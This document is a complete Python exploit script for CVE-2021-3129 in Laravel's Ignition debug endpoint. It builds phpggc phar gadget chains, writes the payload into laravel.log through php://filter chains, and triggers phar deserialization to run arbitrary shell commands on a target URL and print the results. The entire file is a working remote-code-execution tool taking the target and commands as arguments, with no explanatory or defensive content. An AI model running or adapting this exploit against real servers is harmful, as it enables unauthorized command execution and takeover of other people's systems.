#!/usr/bin/env python3
import base64
import os, os.path as osp
import re
import subprocess
import sys
import tempfile
import uuid
from dataclasses import dataclass, field
from shlex import quote
from typing import Iterator, Optional

if sys.version_info[:2] >= (3, 11):
    from typing import Self
else:
    Self = object

import requests


@dataclass
class Handler:
    url: str
    commands: list[str]
    session: requests.Session = field(kw_only=True, default_factory=requests.Session)
    phpggc_dir: Optional[str] = field(kw_only=True, default=None, repr=False)
    endpoint: str = field(init=False, repr=False)
    delimiter: str = field(init=False, repr=False)
    payloads: list[bytes] = field(init=False, repr=False)

    def exploit(self) -> Iterator[str]:
        for i, payload in enumerate(self.gen_payloads()):
            command = self.commands[i]
            if len(command) > 50:
                command = command[:24] + '...' + command[-24:]
            yield f'executing command: {command!r}'
            self.clear_log()
            self.clear_log()
            self.send('a' * 2)
            self.send(payload)
            self.decode_log()
            res = self.get_rce_output()
            if res is None:
                continue
            if sys.stdout.isatty():
                yield 'result:'
            print(res)

    def _vuln_check(self):
        r = self.session.get(self.endpoint, verify=False)
        return r.status_code == 405 and 'laravel' in r.text

    def __post_init__(self):
        self.endpoint = requests.compat.urljoin(self.url, '_ignition/execute-solution')

        if not self._vuln_check():
            raise RuntimeError("target url does not appear to be vulnerable!!!")

        self.delimiter = str(uuid.uuid1())[:8]
        echo = f"echo {quote(self.delimiter)}"
        delim_command = lambda s: " && ".join([echo, s, echo])

        self.payloads = []

        with tempfile.TemporaryDirectory() as workdir:
            if self.phpggc_dir is not None:
                phpggc_dir = self.phpggc_dir
            else:
                phpggc_dir = osp.join(workdir, 'phpggc')
                subprocess.run(
                    [
                        'git',
                        'clone',
                        'https://github.com/ambionics/phpggc.git',
                        phpggc_dir,
                    ],
                    stderr=subprocess.DEVNULL,
                    check=True,
                )
            phpggc = osp.join(phpggc_dir, 'phpggc')
            assert osp.isfile(phpggc), f"file not found: {phpggc!r}"
            php_args = lambda cmd: [
                'php',
                '-d',
                'phar.readonly=0',
                phpggc,
                '--phar',
                'phar',
                '-o',
                'php://output',
                'monolog/rce1',
                'system',
                cmd,
            ]
            for c in map(delim_command, self.commands):
                with (
                    tempfile.NamedTemporaryFile(dir=workdir) as f,
                    subprocess.Popen(php_args(c), stdout=f) as p,
                ):
                    p.wait()
                    if p.returncode != 0:
                        raise subprocess.CalledProcessError(p.returncode, p.args)
                    f.seek(0)
                    self.payloads.append(base64.b64encode(f.read()))

    def __enter__(self) -> Self:
        return self

    def __exit__(self, *exc_info):
        self.session.close()

    def clear_log(self):
        filter_str = '|'.join(
            [
                'convert.iconv.utf-8.utf-16le',
                'convert.quoted-printable-encode',
                'convert.iconv.utf-16le.utf-8',
                'convert.base64-decode',
            ]
        )
        wrapper = (
            f"php://filter/write={filter_str}/resource=../storage/logs/laravel.log"
        )
        return self.send(wrapper)

    def decode_log(self):
        filter_str = '|'.join(
            [
                "convert.quoted-printable-decode",
                "convert.iconv.utf-16le.utf-8",
                "convert.base64-decode",
            ]
        )
        wrapper = (
            f"php://filter/write={filter_str}/resource=../storage/logs/laravel.log"
        )
        return self.send(wrapper)

    def deserialize_log(self) -> Optional[requests.Response]:
        try:
            return self.send("phar://../storage/logs/laravel.log/test.txt", timeout=16)
        except requests.exceptions.ConnectionError as e:
            from urllib3.exceptions import ReadTimeoutError

            for attr in ['__cause__', '__context__']:
                if isinstance(getattr(e, attr, None), ReadTimeoutError):
                    break
            else:
                raise

    def send(self, file: str, **kwargs) -> requests.Response:
        kwargs.update(
            headers={"Accept": "application/json"},
            json={
                "solution": (
                    r"Facade\Ignition\Solutions\MakeViewVariableOptionalSolution"
                ),
                "parameters": {"variableName": "notexist", "viewFile": file},
            },
            verify=False,
        )
        return self.session.post(self.endpoint, **kwargs)

    def gen_payloads(self) -> Iterator[str]:
        for payload_b64 in self.payloads:
            yield ''.join(f"={x:02X}=00" for x in payload_b64) + 'a'

    def get_rce_output(self) -> Optional[str]:
        r = self.deserialize_log()
        if r is None:
            return
        text = r.text
        idx = text.find(self.delimiter)
        if ~idx:
            start = idx + len(self.delimiter) + 1
            stop = text.find(self.delimiter, idx + 1)
            return text[start:stop]
        raise RuntimeError('rce output not found')


def main():
    '''Laravel < 8.4.2 RCE exploit

    exploitable on sites using debug mode (APP_DEBUG)

    https://nvd.nist.gov/vuln/detail/cve-2021-3129

    '''

    import argparse
    from textwrap import dedent

    parser = argparse.ArgumentParser(
        formatter_class=argparse.RawTextHelpFormatter, description=dedent(main.__doc__)
    )
    parser.add_argument(dest='url', metavar='URL', help='target url')
    parser.add_argument(
        dest='commands',
        nargs='+',
        metavar='CMD',
        help='command(s) to execute on the target',
    )
    parser.add_argument(
        '--phpggc',
        dest='phpggc_dir',
        metavar='DIRECTORY',
        help='directory of phpggc executable. if not provided, will clone phpggc repo into temp dir',
        default=argparse.SUPPRESS,
    )

    parsed_args = vars(parser.parse_args())
    try:
        with Handler(**parsed_args) as h:
            for msg in h.exploit():
                print("[\x1b[32m+\x1b[0m]", msg, file=sys.stderr)
    except KeyboardInterrupt as e:
        print(
            "\n[\x1b[32m*\x1b[0m]",
            f"{e.__class__.__name__}:",
            "exiting...",
            file=sys.stderr,
        )
    except RuntimeError as e:
        print("[\x1b[31m-\x1b[0m]", e, file=sys.stderr)


if __name__ == '__main__':
    sys.exit(main())
